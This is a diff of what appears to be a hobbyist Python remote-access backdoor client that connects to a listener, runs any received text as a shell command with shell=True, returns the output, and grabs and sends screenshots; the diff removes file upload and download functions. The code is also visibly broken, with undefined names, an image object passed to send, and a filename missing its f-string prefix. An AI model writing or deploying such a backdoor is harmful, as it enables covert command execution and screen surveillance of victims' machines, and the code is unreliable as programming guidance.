@@ -4,29 +4,15 @@ import os
 from PIL import ImageGrab
 
 
-def download_file():
-    f = open(file, 'wb')
-    client.settimeout(3)
-    chunk = soc.recv(1024)
-    while chunk:
-        try:
-            chunk = soc.recv(1024)
-        except socket.timeout as e:
-            break
-    client.settimeout(None)
-    f.close()
-
-
-def upload_file():
-    f = open(file, 'rb')
-    client.send(f.read())
+count = 0
 
 
 def screenshot():
-    screenshot = ImageGrab.grab()
-    screenshot.save('screenshot.png')
-    screenshot.close()
-
+    shot = ImageGrab.grab()
+    shot.save(f'screenshot{count}.png')
+    client.send(shot)
+    shot.close()
+    os.remove('screenshot{count}.png')
 
 remote_host = '127.0.0.1'
 port = 8080
@@ -38,20 +24,14 @@ while True:
     comm = client.recv(1024).decode()
     if not comm:
         break
-    elif comm [:6] == 'upload':
-        upload_file()
-    elif comm [:9]  == 'downloads':
-        download_file()
-    elif comm [:10] == 'screenshot':
+    elif comm == 'screenshot':
         screenshot()
-        upload_file('screenshot.png')
-        os.remote('screenshot.png')
     else:
         try:
             output = subprocess.check_output(comm, stderr=subprocess.STDOUT, text=True, shell=True)
             client.send(output.encode())
         except subprocess.CalledProcessError as e:
-            msg = f'erro: {e}'
+            msg = f'\nerror: {e}'
             client.send(msg.encode())
 
 client.close()     
